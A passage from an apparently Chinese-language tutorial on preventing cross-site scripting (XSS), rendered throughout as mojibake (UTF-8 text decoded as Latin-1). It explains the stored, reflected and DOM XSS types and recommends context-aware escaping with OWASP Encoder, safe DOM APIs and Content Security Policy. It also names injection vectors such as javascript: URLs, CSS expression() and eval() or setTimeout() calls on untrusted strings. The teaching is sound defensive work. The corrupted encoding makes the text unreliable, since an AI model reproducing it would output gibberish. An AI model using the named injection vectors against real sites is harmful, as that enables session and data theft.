ç­‰å¯æ‰§è¡Œä»£ç ã€‚ åœ¨ onloadã€onerrorã€onclick ç­‰äº‹ä»¶ä¸­ï¼Œæ³¨å…¥ä¸å—æ§åˆ¶ä»£ç ã€‚ åœ¨ style å±æ€§å’Œæ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç±»ä¼¼ background-image:url(&quot;javascript:...&quot;); çš„ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰ã€‚ åœ¨ style å±æ€§å’Œæ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç±»ä¼¼ expression(...) çš„ CSS è¡¨è¾¾å¼ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰ã€‚ æ€»ä¹‹ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰å°†ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬è¿›è¡Œåˆé€‚çš„è¿‡æ»¤ï¼Œå°±è´¸ç„¶æ’å…¥åˆ° HTML ä¸­ï¼Œè¿™å¾ˆå®¹æ˜“é€ æˆæ³¨å…¥æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´ï¼Œæ„é€ å‡ºæ¶æ„çš„ä»£ç æŒ‡ä»¤ï¼Œè¿›è€Œåˆ©ç”¨æ¶æ„ä»£ç å±å®³æ•°æ®å®‰å…¨ã€‚ XSS æ”»å‡»çš„åˆ†ç±»é€šè¿‡ä¸Šè¿°å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»å¯¹ XSS æœ‰äº†ä¸€äº›è®¤è¯†ã€‚ ä»€ä¹ˆæ˜¯ XSSCross-Site Scriptingï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ç®€ç§° XSSï¼Œæ˜¯ä¸€ç§ä»£ç æ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œã€‚åˆ©ç”¨è¿™äº›æ¶æ„è„šæœ¬ï¼Œæ”»å‡»è€…å¯è·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯å¦‚ Cookieã€SessionID ç­‰ï¼Œè¿›è€Œå±å®³æ•°æ®å®‰å…¨ã€‚ ä¸ºäº†å’Œ CSS åŒºåˆ†ï¼Œè¿™é‡ŒæŠŠæ”»å‡»çš„ç¬¬ä¸€ä¸ªå­—æ¯æ”¹æˆäº† Xï¼Œäºæ˜¯å«åš XSSã€‚ XSS çš„æœ¬è´¨æ˜¯ï¼šæ¶æ„ä»£ç æœªç»è¿‡æ»¤ï¼Œä¸ç½‘ç«™æ­£å¸¸çš„ä»£ç æ··åœ¨ä¸€èµ·ï¼›æµè§ˆå™¨æ— æ³•åˆ†è¾¨å“ªäº›è„šæœ¬æ˜¯å¯ä¿¡çš„ï¼Œå¯¼è‡´æ¶æ„è„šæœ¬è¢«æ‰§è¡Œã€‚ è€Œç”±äºç›´æ¥åœ¨ç”¨æˆ·çš„ç»ˆç«¯æ‰§è¡Œï¼Œæ¶æ„ä»£ç èƒ½å¤Ÿç›´æ¥è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæˆ–è€…åˆ©ç”¨è¿™äº›ä¿¡æ¯å†’å……ç”¨æˆ·å‘ç½‘ç«™å‘èµ·æ”»å‡»è€…å®šä¹‰çš„è¯·æ±‚ã€‚ åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç”±äºè¾“å…¥çš„é™åˆ¶ï¼Œæ³¨å…¥çš„æ¶æ„è„šæœ¬æ¯”è¾ƒçŸ­ã€‚ä½†å¯ä»¥é€šè¿‡å¼•å…¥å¤–éƒ¨çš„è„šæœ¬ï¼Œå¹¶ç”±æµè§ˆå™¨æ‰§è¡Œï¼Œæ¥å®Œæˆæ¯”è¾ƒå¤æ‚çš„æ”»å‡»ç­–ç•¥ã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼šç”¨æˆ·æ˜¯é€šè¿‡å“ªç§æ–¹æ³•â€œæ³¨å…¥â€æ¶æ„è„šæœ¬çš„å‘¢ï¼Ÿ ä¸ä»…ä»…æ˜¯ä¸šåŠ¡ä¸Šçš„â€œç”¨æˆ·çš„ UGC å†…å®¹â€å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼ŒåŒ…æ‹¬ URL ä¸Šçš„å‚æ•°ç­‰éƒ½å¯ä»¥æ˜¯æ”»å‡»çš„æ¥æºã€‚åœ¨å¤„ç†è¾“å…¥æ—¶ï¼Œä»¥ä¸‹å†…å®¹éƒ½ä¸å¯ä¿¡ï¼š æ¥è‡ªç”¨æˆ·çš„ UGC ä¿¡æ¯ æ¥è‡ªç¬¬ä¸‰æ–¹çš„é“¾æ¥ URL å‚æ•° POST å‚æ•° Referer ï¼ˆå¯èƒ½æ¥è‡ªä¸å¯ä¿¡çš„æ¥æºï¼‰ Cookie ï¼ˆå¯èƒ½æ¥è‡ªå…¶ä»–å­åŸŸæ³¨å…¥ï¼‰ XSS åˆ†ç±»æ ¹æ®æ”»å‡»çš„æ¥æºï¼ŒXSS æ”»å‡»å¯åˆ†ä¸ºå­˜å‚¨å‹ã€åå°„å‹å’Œ DOM å‹ä¸‰ç§ã€‚ |ç±»å‹|å­˜å‚¨åŒº|æ’å…¥ç‚¹| |-|-| |å­˜å‚¨å‹ XSS|åç«¯æ•°æ®åº“|HTML| |åå°„å‹ XSS|URL|HTML| |DOM å‹ XSS|åç«¯æ•°æ®åº“/å‰ç«¯å­˜å‚¨/URL|å‰ç«¯ JavaScript| å­˜å‚¨åŒºï¼šæ¶æ„ä»£ç å­˜æ”¾çš„ä½ç½®ã€‚ æ’å…¥ç‚¹ï¼šç”±è°å–å¾—æ¶æ„ä»£ç ï¼Œå¹¶æ’å…¥åˆ°ç½‘é¡µä¸Šã€‚ å­˜å‚¨å‹ XSSå­˜å‚¨å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚ ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ã€å•†å“è¯„è®ºã€ç”¨æˆ·ç§ä¿¡ç­‰ã€‚ åå°„å‹ XSSåå°„å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URL æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä» URL ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ åå°„å‹ XSS è·Ÿå­˜å‚¨å‹ XSS çš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨æ•°æ®åº“é‡Œï¼Œåå°„å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨ URL é‡Œã€‚ åå°„å‹ XSS æ¼æ´å¸¸è§äºé€šè¿‡ URL ä¼ é€’å‚æ•°çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ã€è·³è½¬ç­‰ã€‚ ç”±äºéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„ URL æ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚ POST çš„å†…å®¹ä¹Ÿå¯ä»¥è§¦å‘åå°„å‹ XSSï¼Œåªä¸è¿‡å…¶è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼ˆéœ€è¦æ„é€ è¡¨å•æäº¤é¡µé¢ï¼Œå¹¶å¼•å¯¼ç”¨æˆ·ç‚¹å‡»ï¼‰ï¼Œæ‰€ä»¥éå¸¸å°‘è§ã€‚ DOM å‹ XSSDOM å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URLã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œå‰ç«¯ JavaScript å–å‡º URL ä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ DOM å‹ XSS è·Ÿå‰ä¸¤ç§ XSS çš„åŒºåˆ«ï¼šDOM å‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯ JavaScript è‡ªèº«çš„å®‰å…¨æ¼æ´ï¼Œè€Œå…¶ä»–ä¸¤ç§ XSS éƒ½å±äºæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´ã€‚ XSS æ”»å‡»çš„é¢„é˜²é€šè¿‡å‰é¢çš„ä»‹ç»å¯ä»¥å¾—çŸ¥ï¼ŒXSS æ”»å‡»æœ‰ä¸¤å¤§è¦ç´ ï¼š æ”»å‡»è€…æäº¤æ¶æ„ä»£ç ã€‚ æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚ é’ˆå¯¹ç¬¬ä¸€ä¸ªè¦ç´ ï¼šæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿåœ¨ç”¨æˆ·è¾“å…¥çš„è¿‡ç¨‹ï¼Œè¿‡æ»¤æ‰ç”¨æˆ·è¾“å…¥çš„æ¶æ„ä»£ç å‘¢ï¼Ÿ è¾“å…¥è¿‡æ»¤åœ¨ç”¨æˆ·æäº¤æ—¶ï¼Œç”±å‰ç«¯è¿‡æ»¤è¾“å…¥ï¼Œç„¶åæäº¤åˆ°åç«¯ã€‚è¿™æ ·åšæ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸å¯è¡Œã€‚ä¸€æ—¦æ”»å‡»è€…ç»•è¿‡å‰ç«¯è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯·æ±‚ï¼Œå°±å¯ä»¥æäº¤æ¶æ„ä»£ç äº†ã€‚ é‚£ä¹ˆï¼Œæ¢ä¸€ä¸ªè¿‡æ»¤æ—¶æœºï¼šåç«¯åœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åæŠŠâ€œå®‰å…¨çš„â€å†…å®¹ï¼Œè¿”å›ç»™å‰ç«¯ã€‚è¿™æ ·æ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ æˆ‘ä»¬ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·è¾“å…¥äº† 5 &lt; 7 è¿™ä¸ªå†…å®¹ï¼Œåœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œè¢«è½¬ä¹‰ï¼Œå˜æˆäº† 5 &amp;lt; 7ã€‚ é—®é¢˜æ˜¯ï¼šåœ¨æäº¤é˜¶æ®µï¼Œæˆ‘ä»¬å¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œã€‚ è¿™é‡Œçš„â€œå¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œâ€æœ‰ä¸¤å±‚å«ä¹‰ï¼š ç”¨æˆ·çš„è¾“å…¥å†…å®¹å¯èƒ½åŒæ—¶æä¾›ç»™å‰ç«¯å’Œå®¢æˆ·ç«¯ï¼Œè€Œä¸€æ—¦ç»è¿‡äº† escapeHTML()ï¼Œå®¢æˆ·ç«¯æ˜¾ç¤ºçš„å†…å®¹å°±å˜æˆäº†ä¹±ç ( 5 &amp;lt; 7 )ã€‚ åœ¨å‰ç«¯ä¸­ï¼Œä¸åŒçš„ä½ç½®æ‰€éœ€çš„ç¼–ç ä¹Ÿä¸åŒã€‚ å½“ 5 &amp;lt; 7 ä½œä¸º HTML æ‹¼æ¥é¡µé¢æ—¶ï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼š 1&lt;div title="comment"&gt;5 &amp;lt; 7&lt;/div&gt; å½“ 5 &amp;lt; 7 é€šè¿‡ Ajax è¿”å›ï¼Œç„¶åèµ‹å€¼ç»™ JavaScript çš„å˜é‡æ—¶ï¼Œå‰ç«¯å¾—åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯è½¬ä¹‰åçš„å­—ç¬¦ã€‚è¿™ä¸ªå†…å®¹ä¸èƒ½ç›´æ¥ç”¨äº Vue ç­‰æ¨¡æ¿çš„å±•ç¤ºï¼Œä¹Ÿä¸èƒ½ç›´æ¥ç”¨äºå†…å®¹é•¿åº¦è®¡ç®—ã€‚ä¸èƒ½ç”¨äºæ ‡é¢˜ã€alert ç­‰ã€‚ æ‰€ä»¥ï¼Œè¾“å…¥ä¾§è¿‡æ»¤èƒ½å¤Ÿåœ¨æŸäº›æƒ…å†µä¸‹è§£å†³ç‰¹å®šçš„ XSS é—®é¢˜ï¼Œä½†ä¼šå¼•å…¥å¾ˆå¤§çš„ä¸ç¡®å®šæ€§å’Œä¹±ç é—®é¢˜ã€‚åœ¨é˜²èŒƒ XSS æ”»å‡»æ—¶åº”é¿å…æ­¤ç±»æ–¹æ³•ã€‚ å½“ç„¶ï¼Œå¯¹äºæ˜ç¡®çš„è¾“å…¥ç±»å‹ï¼Œä¾‹å¦‚æ•°å­—ã€URLã€ç”µè¯å·ç ã€é‚®ä»¶åœ°å€ç­‰ç­‰å†…å®¹ï¼Œè¿›è¡Œè¾“å…¥è¿‡æ»¤è¿˜æ˜¯å¿…è¦çš„ã€‚ æ—¢ç„¶è¾“å…¥è¿‡æ»¤å¹¶éå®Œå…¨å¯é ï¼Œæˆ‘ä»¬å°±è¦é€šè¿‡â€œé˜²æ­¢æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç â€æ¥é˜²èŒƒ XSSã€‚è¿™éƒ¨åˆ†åˆ†ä¸ºä¸¤ç±»ï¼š é˜²æ­¢ HTML ä¸­å‡ºç°æ³¨å…¥ã€‚ é˜²æ­¢ JavaScript æ‰§è¡Œæ—¶ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ é¢„é˜²å­˜å‚¨å‹å’Œåå°„å‹ XSS æ”»å‡»å­˜å‚¨å‹å’Œåå°„å‹ XSS éƒ½æ˜¯åœ¨æœåŠ¡ç«¯å–å‡ºæ¶æ„ä»£ç åï¼Œæ’å…¥åˆ°å“åº” HTML é‡Œçš„ï¼Œæ”»å‡»è€…åˆ»æ„ç¼–å†™çš„â€œæ•°æ®â€è¢«å†…åµŒåˆ°â€œä»£ç â€ä¸­ï¼Œè¢«æµè§ˆå™¨æ‰€æ‰§è¡Œã€‚ é¢„é˜²è¿™ä¸¤ç§æ¼æ´ï¼Œæœ‰ä¸¤ç§å¸¸è§åšæ³•ï¼š æ”¹æˆçº¯å‰ç«¯æ¸²æŸ“ï¼ŒæŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€ã€‚ å¯¹ HTML åšå……åˆ†è½¬ä¹‰ã€‚ çº¯å‰ç«¯æ¸²æŸ“çº¯å‰ç«¯æ¸²æŸ“çš„è¿‡ç¨‹ï¼š æµè§ˆå™¨å…ˆåŠ è½½ä¸€ä¸ªé™æ€ HTMLï¼Œæ­¤ HTML ä¸­ä¸åŒ…å«ä»»ä½•è·Ÿä¸šåŠ¡ç›¸å…³çš„æ•°æ®ã€‚ ç„¶åæµè§ˆå™¨æ‰§è¡Œ HTML ä¸­çš„ JavaScriptã€‚ JavaScript é€šè¿‡ Ajax åŠ è½½ä¸šåŠ¡æ•°æ®ï¼Œè°ƒç”¨ DOM API æ›´æ–°åˆ°é¡µé¢ä¸Šã€‚ åœ¨çº¯å‰ç«¯æ¸²æŸ“ä¸­ï¼Œæˆ‘ä»¬ä¼šæ˜ç¡®çš„å‘Šè¯‰æµè§ˆå™¨ï¼šä¸‹é¢è¦è®¾ç½®çš„å†…å®¹æ˜¯æ–‡æœ¬ï¼ˆ.innerTextï¼‰ï¼Œè¿˜æ˜¯å±æ€§ï¼ˆ.setAttributeï¼‰ï¼Œè¿˜æ˜¯æ ·å¼ï¼ˆ.styleï¼‰ç­‰ç­‰ã€‚æµè§ˆå™¨ä¸ä¼šè¢«è½»æ˜“çš„è¢«æ¬ºéª—ï¼Œæ‰§è¡Œé¢„æœŸå¤–çš„ä»£ç äº†ã€‚ ä½†çº¯å‰ç«¯æ¸²æŸ“è¿˜éœ€æ³¨æ„é¿å… DOM å‹ XSS æ¼æ´ï¼ˆä¾‹å¦‚ onload äº‹ä»¶å’Œ href ä¸­çš„ javascript:xxx ç­‰ï¼Œè¯·å‚è€ƒä¸‹æ–‡â€é¢„é˜² DOM å‹ XSS æ”»å‡»â€œéƒ¨åˆ†ï¼‰ã€‚ åœ¨å¾ˆå¤šå†…éƒ¨ã€ç®¡ç†ç³»ç»Ÿä¸­ï¼Œé‡‡ç”¨çº¯å‰ç«¯æ¸²æŸ“æ˜¯éå¸¸åˆé€‚çš„ã€‚ä½†å¯¹äºæ€§èƒ½è¦æ±‚é«˜ï¼Œæˆ–æœ‰ SEO éœ€æ±‚çš„é¡µé¢ï¼Œæˆ‘ä»¬ä»ç„¶è¦é¢å¯¹æ‹¼æ¥ HTML çš„é—®é¢˜ã€‚ è½¬ä¹‰ HTMLå¦‚æœæ‹¼æ¥ HTML æ˜¯å¿…è¦çš„ï¼Œå°±éœ€è¦é‡‡ç”¨åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¯¹ HTML æ¨¡æ¿å„å¤„æ’å…¥ç‚¹è¿›è¡Œå……åˆ†çš„è½¬ä¹‰ã€‚ å¸¸ç”¨çš„æ¨¡æ¿å¼•æ“ï¼Œå¦‚ doT.jsã€ejsã€FreeMarker ç­‰ï¼Œå¯¹äº HTML è½¬ä¹‰é€šå¸¸åªæœ‰ä¸€ä¸ªè§„åˆ™ï¼Œå°±æ˜¯æŠŠ &amp; &lt; &gt; &quot; &#39; / è¿™å‡ ä¸ªå­—ç¬¦è½¬ä¹‰æ‰ï¼Œç¡®å®èƒ½èµ·åˆ°ä¸€å®šçš„ XSS é˜²æŠ¤ä½œç”¨ï¼Œä½†å¹¶ä¸å®Œå–„ï¼š |XSS å®‰å…¨æ¼æ´|ç®€å•è½¬ä¹‰æ˜¯å¦æœ‰é˜²æŠ¤ä½œç”¨| |-|-| |HTML æ ‡ç­¾æ–‡å­—å†…å®¹|æœ‰| |HTML å±æ€§å€¼|æœ‰| |CSS å†…è”æ ·å¼|æ— | |å†…è” JavaScript|æ— | |å†…è” JSON|æ— | |è·³è½¬é“¾æ¥|æ— | æ‰€ä»¥è¦å®Œå–„ XSS é˜²æŠ¤æªæ–½ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æ›´å®Œå–„æ›´ç»†è‡´çš„è½¬ä¹‰ç­–ç•¥ã€‚ ä¾‹å¦‚ Java å·¥ç¨‹é‡Œï¼Œå¸¸ç”¨çš„è½¬ä¹‰åº“ä¸º org.owasp.encoderã€‚ä»¥ä¸‹ä»£ç å¼•ç”¨è‡ª org.owasp.encoder çš„å®˜æ–¹è¯´æ˜ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!-- HTML æ ‡ç­¾å†…æ–‡å­—å†…å®¹ --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML æ ‡ç­¾å±æ€§å€¼ --&gt;&lt;input value="&lt;%= Encode.forHtml(UNTRUSTED) %&gt;" /&gt;&lt;!-- CSS å±æ€§å€¼ --&gt;&lt;div style="width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"&gt; &lt;!-- CSS URL --&gt; &lt;div style="background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"&gt; &lt;!-- JavaScript å†…è”ä»£ç å— --&gt; &lt;script&gt; var msg = '&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;'; alert(msg); &lt;/script&gt; &lt;!-- JavaScript å†…è”ä»£ç å—å†…åµŒ JSON --&gt; &lt;script&gt; var __INITIAL_STATE__ = JSON.parse( '&lt;%= Encoder.forJavaScript(data.to_json) %&gt;' ); &lt;/script&gt; &lt;!-- HTML æ ‡ç­¾å†…è”ç›‘å¬å™¨ --&gt; &lt;button onclick="alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"&gt; click me &lt;/button&gt; &lt;!-- URL å‚æ•° --&gt; &lt;a href="/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top" &gt; &lt;!-- URL è·¯å¾„ --&gt; &lt;a href="/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"&gt; &lt;!-- URL. æ³¨æ„ï¼šè¦æ ¹æ®é¡¹ç›®æƒ…å†µè¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢æ‰ "javascript:" é“¾æ¥ã€éæ³• scheme ç­‰--&gt; &lt;a href='&lt;%= urlValidator.isValid(UNTRUSTED) ? Encode.forHtml(UNTRUSTED) : "/404"%&gt;' &gt; link &lt;/a&gt;&lt;/a &gt;&lt;/a &gt; &lt;/div&gt;&lt;/div&gt; å¯è§ï¼ŒHTML çš„ç¼–ç æ˜¯ååˆ†å¤æ‚çš„ï¼Œåœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡é‡Œè¦ä½¿ç”¨ç›¸åº”çš„è½¬ä¹‰è§„åˆ™ã€‚ é¢„é˜² DOM å‹ XSS æ”»å‡»DOM å‹ XSS æ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯ JavaScript ä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚ åœ¨ä½¿ç”¨ .innerHTMLã€.outerHTMLã€document.write() æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸º HTML æ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ .textContentã€.setAttribute()ç­‰ã€‚ å¦‚æœç”¨ Vue/React æŠ€æœ¯æ ˆï¼Œå¹¶ä¸”ä¸ä½¿ç”¨ v-html/dangerouslySetInnerHTML åŠŸèƒ½ï¼Œå°±åœ¨å‰ç«¯ render é˜¶æ®µé¿å… innerHTMLã€outerHTML çš„ XSS éšæ‚£ã€‚ DOM ä¸­çš„å†…è”äº‹ä»¶ç›‘å¬å™¨ï¼Œå¦‚ locationã€onclickã€onerrorã€onloadã€onmouseover ç­‰ï¼Œ&lt;a&gt; æ ‡ç­¾çš„ href å±æ€§ï¼ŒJavaScript çš„ eval()ã€setTimeout()ã€setInterval() ç­‰ï¼Œéƒ½èƒ½æŠŠå­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œã€‚å¦‚æœä¸å¯ä¿¡çš„æ•°æ®æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ä¼ é€’ç»™è¿™äº› APIï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨éšæ‚£ï¼Œè¯·åŠ¡å¿…é¿å…ã€‚ 1234567891011121314151617&lt;!-- å†…è”äº‹ä»¶ç›‘å¬å™¨ä¸­åŒ…å«æ¶æ„ä»£ç  --&gt;![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)&lt;!-- é“¾æ¥å†…åŒ…å«æ¶æ„ä»£ç  --&gt;&lt;a href="UNTRUSTED"&gt;1&lt;/a&gt;&lt;script&gt; // setTimeout()/setInterval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  setTimeout('UNTRUSTED'); setInterval('UNTRUSTED'); // location è°ƒç”¨æ¶æ„ä»£ç  location.href = 'UNTRUSTED'; // eval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  eval('UNTRUSTED');&lt;/script&gt; å¦‚æœé¡¹ç›®ä¸­æœ‰ç”¨åˆ°è¿™äº›çš„è¯ï¼Œä¸€å®šè¦é¿å…åœ¨å­—ç¬¦ä¸²ä¸­æ‹¼æ¥ä¸å¯ä¿¡æ•°æ®ã€‚ å…¶ä»– XSS é˜²èŒƒæªæ–½è™½ç„¶åœ¨æ¸²æŸ“é¡µé¢å’Œæ‰§è¡Œ JavaScript æ—¶ï¼Œé€šè¿‡è°¨æ…çš„è½¬ä¹‰å¯ä»¥é˜²æ­¢ XSS çš„å‘ç”Ÿï¼Œä½†å®Œå…¨ä¾é å¼€å‘çš„è°¨æ…ä»ç„¶æ˜¯ä¸å¤Ÿçš„ã€‚ä»¥ä¸‹ä»‹ç»ä¸€äº›é€šç”¨çš„æ–¹æ¡ˆï¼Œå¯ä»¥é™ä½ XSS å¸¦æ¥çš„é£é™©å’Œåæœã€‚ Content Security Policyä¸¥æ ¼çš„ CSP åœ¨ XSS çš„é˜²èŒƒä¸­å¯ä»¥èµ·åˆ°ä»¥ä¸‹çš„ä½œç”¨ï¼š ç¦æ­¢åŠ è½½å¤–åŸŸä»£ç ï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘ã€‚ ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åï¼Œç”¨æˆ·çš„æ•°æ®ä¸ä¼šæ³„éœ²åˆ°å¤–åŸŸã€‚ ç¦æ­¢å†…è”è„šæœ¬æ‰§è¡Œï¼ˆè§„åˆ™è¾ƒä¸¥æ ¼ï¼Œç›®å‰å‘ç° GitHub ä½¿ç”¨ï¼‰ã€‚ ç¦æ­¢æœªæˆæƒçš„è„šæœ¬æ‰§è¡Œï¼ˆæ–°ç‰¹æ€§ï¼ŒGoogle Map ç§»åŠ¨ç‰ˆåœ¨ä½¿ç”¨ï¼‰ã€‚ åˆç†ä½¿ç”¨ä¸ŠæŠ¥å¯ä»¥åŠæ—¶å‘ç° XSSï¼Œåˆ©äºå°½å¿«ä¿®å¤é—®é¢˜ã€‚ å…³äº CSP çš„è¯¦æƒ…ï¼Œè¯·å…³æ³¨å‰ç«¯å®‰å…¨ç³»åˆ—åç»­çš„æ–‡ç« ã€‚ è¾“å…¥å†…å®¹é•¿åº¦æ§åˆ¶å¯¹äºä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œéƒ½åº”è¯¥é™å®šä¸€ä¸ªåˆç†çš„é•¿åº¦ã€‚è™½ç„¶æ— æ³•å®Œå…¨é˜²æ­¢ XSS å‘ç”Ÿï¼Œä½†å¯ä»¥å¢åŠ  XSS æ”»å‡»çš„éš¾åº¦ã€‚ 